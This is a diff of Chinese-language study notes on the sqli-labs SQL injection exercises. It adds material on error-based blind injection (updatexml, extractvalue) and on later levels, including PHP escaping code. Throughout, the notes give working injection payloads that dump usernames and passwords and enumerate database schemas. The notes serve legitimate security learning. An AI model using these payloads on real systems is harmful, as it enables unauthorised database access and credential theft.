@@ -49,7 +49,7 @@
 
     或：
 
-    group_concat(id,'~',username,'~',password),3 from security.users where id=2--+
+    group_concat(id,'\~',username,'\~',password),3 from security.users where id=2--+
 
 ## Less2
 
@@ -73,7 +73,7 @@
 
 使用双引号和括号闭合
 
-## Less5(盲注)
+## Less5
 
 ```php
 {
@@ -189,6 +189,33 @@ limit 1,1
 
 >   id=1'and ascii(substr((select email_id from emails limit 0,1),1,1))>'a'--+
 
+### 基于报错的盲注
+
+由于源代码中出现了`print_r(mysql_error)`，导致报错注入的可行，若是源码中未将错误信息打印，则不能进行报错注入
+
+基于报错的有很多，这里写两个：
+
+几个有用函数：
+
+-   updatexml()：对xml进行查询和修改
+-   extractvalue()：对xml进行查询和修改，最大长度为32，要获取后面的，使用substring()
+
+比如：
+
+**updatexml():**
+
+>   id=1' and UpdateXml(1,concat(0x7e,(SELECT schema_name from information_schema.schemata limit 1,1),0x7e),1)--+
+
+>   id=1' and UpdateXml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+
+
+等等等......
+
+**extractvalue():**
+
+>   id=1' and extractvalue(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))--+
+
+等等等，和正常注入都一样了......
+
 ## Less6
 
 闭合与less5不同
@@ -228,7 +255,7 @@ secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FIL
 
 单引号闭合的时间注入
 
-### 时间盲注
+### 基于时间的盲注
 
 猜库：
 
@@ -267,3 +294,83 @@ username： admin' #
 111' union select 1,database()#
 
 等等等，后面的和get的就都一样了。
+
+## Less12
+
+双引号和括号
+
+其他和Less11相同
+
+## Less13
+
+将提示信息都注释掉了，可以采用布尔盲注。
+
+## Less14
+
+双引号，报错注入
+
+## Less15
+
+单引号，可以布尔盲注或时间盲注。
+
+## Less16
+
+双引号，同15
+
+## Less17
+
+```php
+function check_input($value)
+	{
+	if(!empty($value))
+		{
+		// truncation (see comments)
+		$value = substr($value,0,15);
+		}
+
+		// Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc())
+			{
+			$value = stripslashes($value);
+			}
+
+		// Quote if not a number
+		if (!ctype_digit($value))
+			{
+			$value = "'" . mysql_real_escape_string($value) . "'";
+			}
+		
+	else
+		{
+		$value = intval($value);
+		}
+	return $value;
+	}
+
+```
+
+这一关对usname进行过滤，解释下上面用到的函数;
+
+-   addslashes()函数
+
+    对预定义的字符进行转义，默认php对所有的get，post，Cookie数据运行addslashes()函数
+
+    预定义字符：
+
+    >   单引号，双引号，反斜杠
+
+-   stripslashes()函数
+
+-   
+
+    删除addslashes()函数添加的转义反斜杠
+
+-   mysql_real_escape_string()函数
+
+    转义特殊字符，比如：单引，双引，\，\x00等
+
+对usname进行了，上述过滤，但是password没有，所以对password进行注入。
+
+## Less18
+
+这关对uname和passwd都进行了检查，
